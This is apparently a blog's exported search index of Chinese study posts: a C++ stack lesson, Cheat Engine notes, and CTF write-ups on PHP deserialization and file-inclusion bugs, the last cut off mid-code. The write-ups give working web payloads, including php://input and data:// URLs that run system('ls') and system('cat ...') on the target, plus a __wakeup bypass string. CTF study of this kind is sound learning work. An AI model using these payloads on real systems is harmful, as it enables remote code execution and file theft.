<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>想了那么多,不是很想打比赛了</title>
    <url>/2022/06/07/gosumemory%20-%20%E5%89%AF%E6%9C%AC/</url>
    <content><![CDATA[<p> 大学快过去一年的时间了,自己的理解和感悟仍然是那么的菜<br>想更上一层楼寻找保研的途径,但没有任何办法<br>“放 弃” 止 损<br>做好当下吧</p>
<!--- more -->

]]></content>
  </entry>
  <entry>
    <title>表达式的值和计算</title>
    <url>/2022/06/16/%E5%AE%9E%E9%AA%8C%E8%AF%BE1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC%E5%92%8C%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="第一节课内容"><a href="#第一节课内容" class="headerlink" title="第一节课内容:"></a>第一节课内容:</h1><p>​    预备学习课题任务: 学习使用C++ STL-栈应用<br>​    基本任务: 算数表达式求值(应用map容器)<br>​    扩展任务1:较复杂的表达式求值和交互式求值(难,模板化实现)<br>​    扩展任务2: 求真值表达式的应用<br>​    扩展任务3: 二元树和表达式</p>
<h2 id="基本任务1"><a href="#基本任务1" class="headerlink" title="基本任务1:"></a>基本任务1:</h2><h3 id="STL-栈应用的实现"><a href="#STL-栈应用的实现" class="headerlink" title="STL-栈应用的实现:"></a>STL-栈应用的实现:</h3><ol>
<li>  创建一个stack类模板: 名字为stk;</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span> &gt; stk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h4 id="push-用来把元素入栈"><a href="#push-用来把元素入栈" class="headerlink" title="push() 用来把元素入栈"></a>push() 用来把元素入栈</h4>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n); <span class="comment">//stk.push(n) 把n加入到栈中</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><h4 id="top-用来访问栈顶元素"><a href="#top-用来访问栈顶元素" class="headerlink" title="top() 用来访问栈顶元素"></a>top() 用来访问栈顶元素</h4></li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">//0 1 2 3</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">// 输出3 //stk.top()的值 也就是栈顶的值3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>  pop() 弹出栈顶元素</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">pop</span>();<span class="comment">//移除栈顶元素 (无返回值)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">//输出2 //弹出栈顶后还有一个值就是2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>empty() 判断栈空?</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">empty</span>();  <span class="comment">//判断栈是否为空,如果为空则输出true,否则输出false</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;此时栈顶的值为&quot;</span>&lt;&lt;stk.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">		stk.<span class="built_in">pop</span>(); <span class="comment">//弹出元素</span></span><br><span class="line">		cout&lt;&lt;boolalpha&lt;&lt;<span class="string">&quot;栈空?:&quot;</span>&lt;&lt;stk.<span class="built_in">empty</span>()&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* 输出结果:</span></span><br><span class="line"><span class="comment">此时栈顶的值为3</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为2</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为1</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为0</span></span><br><span class="line"><span class="comment">栈空?:true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>size() 统计栈中的元素</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>  n=stk.<span class="built_in">size</span>(); <span class="comment">//注意返回值为long long 类型</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,n);</span><br><span class="line">    <span class="comment">//输出:4  //此时栈中共有4个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="简单算数表达式的求值"><a href="#简单算数表达式的求值" class="headerlink" title="简单算数表达式的求值"></a>简单算数表达式的求值</h3></li>
</ol>
]]></content>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>JS乱码问题</title>
    <url>/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="JS乱码问题"><a href="#JS乱码问题" class="headerlink" title="JS乱码问题"></a>JS乱码问题</h3><p><img src="/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143813041.png" alt="image-20220302143813041"></p>
<p>打开一个附件<br> <a href="......%5CFX%5CFanXIngX%5C646ecdf05af7490a85bb5c8ccb96c102(1).zip">646ecdf05af7490a85bb5c8ccb96c102(1).zip</a> </p>
<p><img src="/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143905163.png" alt="image-20220302143905163"></p>
<p>用TXT文档打开后发现乱码。<br>script 看得出是js脚本<br>添加后缀名：.html</p>
<p>用浏览器打开</p>
<hr>
<p>分析代码：</p>
<p><img src="/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144157222.png" alt="image-20220302144157222"></p>
<p><strong>利用console.log( ) 在浏览器中调试代码 显现出正确代码（核心）</strong></p>
<p>将eval(<em>) 改为console.log(</em>) 然后 吧script指示删除。</p>
<p>打开浏览器控制台。</p>
<hr>
<p><img src="/2022/03/02/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144543359.png" alt="image-20220302144543359"></p>
<p>看见正确的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;<span class="comment">//获取c中ID的值，也就是按钮的值</span></span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>) <span class="comment">//对e输入的字符串长度需要为16</span></span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)<span class="comment">//打开正则表达式表格。匹配开头为be0f23</span></span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配233ac</span></span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配e98aa结束</span></span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配c7be9 如果输入的e满足这五个if，就能返回flag</span></span><br><span class="line">                                            <span class="comment">//根据首位确定凑出e的值 be0f233ac7be98aa</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                                s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>) <span class="comment">//返回flag</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;buttononclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>稍微整理一下</p>
<p>分析代码即可获得答案.</p>
]]></content>
  </entry>
  <entry>
    <title>CE的工作原理 笔记</title>
    <url>/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="第一部分：基础知识-计算机是如何运行游戏的"><a href="#第一部分：基础知识-计算机是如何运行游戏的" class="headerlink" title="第一部分：基础知识-计算机是如何运行游戏的"></a>第一部分：基础知识-计算机是如何运行游戏的</h2><p>总结:</p>
<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217155807949.png" alt="image-20220217155807949"></p>
<h2 id="第二部分：基础知识-CE的工作原理"><a href="#第二部分：基础知识-CE的工作原理" class="headerlink" title="第二部分：基础知识-CE的工作原理"></a>第二部分：基础知识-CE的工作原理</h2><p>CE监控游戏的内存，并对其进行任意的修改。<img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160325859.png" alt="image-20220217160325859"></p>
<p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160630264.png" alt="image-20220217160630264"></p>
<p>修改的一般思路：去哪里 干什么</p>
<h2 id="第三部分：基础知识-二进制的表示"><a href="#第三部分：基础知识-二进制的表示" class="headerlink" title="第三部分：基础知识-二进制的表示"></a>第三部分：基础知识-二进制的表示</h2><p>十六进制数表示二进制数</p>
<p>0-F对应 1-15；</p>
<h2 id="第四部分数据：修改-基本操作"><a href="#第四部分数据：修改-基本操作" class="headerlink" title="第四部分数据：修改-基本操作"></a>第四部分数据：修改-基本操作</h2><p><img src="/2022/02/17/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217161151056.png" alt="image-20220217161151056"></p>
<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2>]]></content>
  </entry>
  <entry>
    <title>unserialize3 wp</title>
    <url>/2022/01/16/unserialize3/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>审计源码，看见__wakeup 以及题目unserialize3 猜想依旧是反序列化漏洞</p>
<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
<blockquote>
<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class xctf&#123;</span><br><span class="line">	public $flag = &#x27;111&#x27;;</span><br><span class="line">	public function __wakeup()&#123;</span><br><span class="line">	exit(&#x27;bad requests&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$b=serialize(new xctf);</span><br><span class="line">	echo ($b);</span><br><span class="line">?&gt;</span><br><span class="line">输出结果:</span><br><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">改为</span><br><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">浏览器输入</span><br><span class="line">http://111.200.241.244:64582/index.php?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/unserialize3/image-20220116235331921.png" alt="image-20220116235331921"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XTCTF Web_php_include</title>
    <url>/2022/01/16/Web_php_include/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开网页 审计源码。</p>
<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
<p>解法1：</p>
<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
<p>第二解法：</p>
<p>​    利用data://伪协议绕过php协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><strong>data://text/plain协议</strong></p>
<p>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p>
<p>使用方法：data://text/plain;base64,base64编码字符 如<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<p>data://text/plain,字符  如<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p>
<p><strong>php:input协议</strong></p>
<p>此协议需要allow_url_include为on，可以访问请求的原始数据的只读流,  将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
<p>使用方法：php://input,然后post需要执行的数据 如<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>  然后在post中<?php phpinfo() ?><img src="/2022/01/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE/1937742-20200208105940639-1014101743.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>Web_php_unserialize wp</title>
    <url>/2022/01/15/Web_php_unserialize/</url>
    <content><![CDATA[<h3 id="攻防世界-Web-php-unserialize-wp"><a href="#攻防世界-Web-php-unserialize-wp" class="headerlink" title="攻防世界:Web_php_unserialize wp"></a>攻防世界:Web_php_unserialize wp</h3><p>由题可知道，该题为php反序列化漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计代码。发现有几处函数不懂。通过查阅资料可知</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()：析构函数</span><br><span class="line">构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</span><br><span class="line">在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。</span><br><span class="line">而析构函数正是在垃圾回收机制回收对象之前调用的。</span><br><span class="line">简而言之。 destruct在最后执行。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() 在执行unserialize($var);前，会执行__wakeup()函数。因此需要绕过。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset(变量): 判读变量值是否为NULL（&quot;\0&quot;），若是，则返回false。否则返回true.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match():正则匹配模式，匹配var变量中是否有 [oc]:\d+:</span><br><span class="line">我们需要明白OC匹配模式的规则</span><br><span class="line">正则表达式：是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串，简单说，就是我们写个模板，然后去匹配字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/Web_php_unserialize/image-20220115141748577.png" alt="image-20220115141748577"></p>
<p>附匹配规则表</p>
<p>第12行可知，flag很可能在fl4g.php中<img src="/2022/01/15/Web_php_unserialize/image-20220115141815743.png" alt="image-20220115141815743" style="zoom:50%;"></p>
<p>添加/fl4g.php 网页空白。<br>其实是在Demo类中，执行了wakeup()，使得file强制赋值为了index.php.</p>
<p>我们需要GET请求var值绕过preg_match和wakeup()。</p>
<p><img src="/2022/01/15/Web_php_unserialize/image-20220115014622417.png" alt="image-20220115014622417"></p>
<p>我们可以利用CVE-2016漏洞跳过wakeup()</p>
<p>由于本人毫无写php的基础。因此附上网上wp的php脚本进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象,并且创建对象时，自动且先调用了__construct函数，</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span 